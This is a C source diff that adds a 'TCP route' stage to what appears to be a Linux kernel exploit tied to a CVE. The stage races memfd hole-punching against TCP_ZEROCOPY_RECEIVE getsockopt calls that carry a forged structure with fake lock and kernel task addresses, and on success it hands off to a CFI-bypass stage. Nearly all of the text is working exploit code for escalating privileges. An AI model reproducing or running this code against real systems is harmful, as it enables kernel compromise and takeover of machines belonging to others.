@@ -424,3 +424,240 @@ fail:
   SYSCHK(close(fd));
   return 0;
 }
+
+int tcp_route_selected(void) {
+  const char *env = getenv("CVE43499_TCP_ROUTE");
+  if (env && *env && strcmp(env, "0") != 0) return 1;
+  return 0;
+}
+
+#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
+#define TCP_ROUTE_ATTEMPTS 2000
+#define TCP_ARM_SEQ 16
+#define TCP_POST_GETSOCKOPT_HOLD 20000
+
+static atomic_int tcp_punch_go;
+static atomic_int tcp_punch_stop;
+static atomic_int tcp_punch_phase;
+static atomic_int tcp_punch_failed;
+
+static void tcp_wait_for_consumer_idle(void) {
+  atomic_store(&punch_consume_go, 0);
+  while (atomic_load(&consumer_inflight)) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+}
+
+static int tcp_make_pair(int *client_fd, int *server_fd) {
+  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (listener < 0) return -1;
+  int one = 1;
+  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+
+  struct sockaddr_in addr;
+  memset(&addr, 0, sizeof(addr));
+  addr.sin_family = AF_INET;
+  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+  addr.sin_port = 0;
+
+  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
+      listen(listener, 1) != 0) {
+    int saved = errno;
+    close(listener);
+    errno = saved;
+    return -1;
+  }
+
+  socklen_t addr_len = sizeof(addr);
+  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
+    int saved = errno;
+    close(listener);
+    errno = saved;
+    return -1;
+  }
+
+  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (*client_fd < 0) {
+    int saved = errno;
+    close(listener);
+    errno = saved;
+    return -1;
+  }
+  if (connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+    int saved = errno;
+    close(*client_fd);
+    close(listener);
+    errno = saved;
+    return -1;
+  }
+
+  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
+  int saved = errno;
+  close(listener);
+  if (*server_fd < 0) {
+    close(*client_fd);
+    errno = saved;
+    return -1;
+  }
+  return 0;
+}
+
+struct tcp_punch_state {
+  int fd;
+  size_t page_size;
+};
+
+static void *tcp_punch_thread(void *arg) {
+  disable_rseq_for_thread();
+  struct tcp_punch_state *state = arg;
+  while (!atomic_load(&tcp_punch_go) && !atomic_load(&tcp_punch_stop)) {
+    sched_yield();
+  }
+  while (!atomic_load(&tcp_punch_stop)) {
+    if (fallocate(state->fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
+      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
+      break;
+    }
+    atomic_store(&tcp_punch_phase, 1);
+    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
+                  (off_t)state->page_size,
+                  TCP_PUNCH_SHMEM_LEN - state->page_size) != 0) {
+      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
+    }
+    atomic_store(&tcp_punch_phase, 0);
+    if (atomic_load(&tcp_punch_failed)) break;
+  }
+  return NULL;
+}
+
+void do_tcp_fake_lock_route(void) {
+  if (!page_base || !fake_lock || !fake_fops) {
+    cfi_last_step = 40;
+    pr_error("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
+             page_base, fake_lock, fake_fops);
+    return;
+  }
+
+  int client_fd = -1, server_fd = -1, punch_fd = -1;
+  char *map = MAP_FAILED;
+  pthread_t puncher;
+  int puncher_started = 0;
+  int route_ok = 0;
+
+  if (tcp_make_pair(&client_fd, &server_fd) != 0) {
+    cfi_last_step = 41;
+    pr_error("tcp route pair setup failed errno=%d\n", errno);
+    return;
+  }
+
+  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+  punch_fd = (int)syscall(SYS_memfd_create, "cve43499-tcp", MFD_CLOEXEC);
+  if (punch_fd < 0 || fallocate(punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
+    cfi_last_step = 42;
+    goto out;
+  }
+  map = mmap(NULL, TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
+             MAP_SHARED, punch_fd, 0);
+  if (map == MAP_FAILED) {
+    cfi_last_step = 43;
+    goto out;
+  }
+  for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += page_size) {
+    map[off] = 0x55;
+  }
+
+  struct tcp_punch_state punch_state = {.fd = punch_fd, .page_size = page_size};
+  atomic_store(&tcp_punch_stop, 0);
+  atomic_store(&tcp_punch_phase, 0);
+  atomic_store(&tcp_punch_failed, 0);
+  atomic_store(&punch_consume_stop, 0);
+  atomic_store(&punch_consume_go, 0);
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+
+  if (pthread_create(&puncher, NULL, tcp_punch_thread, &punch_state) != 0) {
+    cfi_last_step = 44;
+    goto out;
+  }
+  puncher_started = 1;
+
+  uintptr_t waiter_task = SLIDE_INIT_TASK;
+
+  pr_info("tcp route enter page=%016zx fake_lock=%016zx task=%016zx\n",
+          page_base, fake_lock, waiter_task);
+
+  atomic_store(&tcp_punch_go, 1);
+  atomic_store(&main_route_delay_usec, 0);
+
+  char sendbuf[64];
+  memset(sendbuf, 0x33, sizeof(sendbuf));
+
+  for (int i = 1; i <= TCP_ROUTE_ATTEMPTS && !route_ok; i++) {
+    int calls_before = atomic_load(&consumer_calls);
+    int success_before = atomic_load(&consumer_success);
+    (void)send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
+    while (atomic_load(&tcp_punch_phase)) sched_yield();
+    for (int spin = 0;
+         !atomic_load(&tcp_punch_phase) && !atomic_load(&tcp_punch_failed) &&
+         spin < 10000000;
+         spin++) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+    if (atomic_load(&tcp_punch_failed)) {
+      cfi_last_step = 46;
+      break;
+    }
+
+    unsigned char zc[0x40];
+    memset(zc, 0, sizeof(zc));
+    put64(zc, 0x18, (uint64_t)(uintptr_t)(map + page_size));
+    put32(zc, 0x20, sizeof(sendbuf));
+    put64(zc, 0x28, waiter_task);
+    put64(zc, 0x30, fake_lock);
+
+    socklen_t len = sizeof(zc);
+    errno = 0;
+    int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc, &len);
+
+    if (i >= TCP_ARM_SEQ && ret == 0) {
+      atomic_store(&punch_consume_go, i);
+      for (int spin = 0; spin < TCP_POST_GETSOCKOPT_HOLD; spin++) {
+        __asm__ volatile("yield" ::: "memory");
+      }
+      tcp_wait_for_consumer_idle();
+    }
+
+    int calls = atomic_load(&consumer_calls);
+    int success = atomic_load(&consumer_success);
+    if (calls <= calls_before || success <= success_before) {
+      if ((i % 100) == 0 || ret != 0) {
+        pr_info("tcp route seq=%d ret=%d errno=%d calls=%d success=%d\n",
+                i, ret, errno, calls, success);
+      }
+      continue;
+    }
+    route_ok = 1;
+    cfi_last_step = 0;
+  }
+
+out:
+  atomic_store(&punch_consume_go, 0);
+  atomic_store(&punch_consume_stop, 1);
+  atomic_store(&tcp_punch_go, 0);
+  atomic_store(&tcp_punch_stop, 1);
+  if (puncher_started) pthread_join(puncher, NULL);
+  if (map != MAP_FAILED) munmap(map, TCP_PUNCH_SHMEM_LEN);
+  if (punch_fd >= 0) close(punch_fd);
+  if (server_fd >= 0) close(server_fd);
+  if (client_fd >= 0) close(client_fd);
+
+  pr_info("tcp route done=%d calls=%d success=%d step=%d\n",
+          route_ok, atomic_load(&consumer_calls),
+          atomic_load(&consumer_success), cfi_last_step);
+
+  if (route_ok) {
+    if (try_cfi_stage()) {
+      cfi_last_step = 0;
+    }
+  }
+}
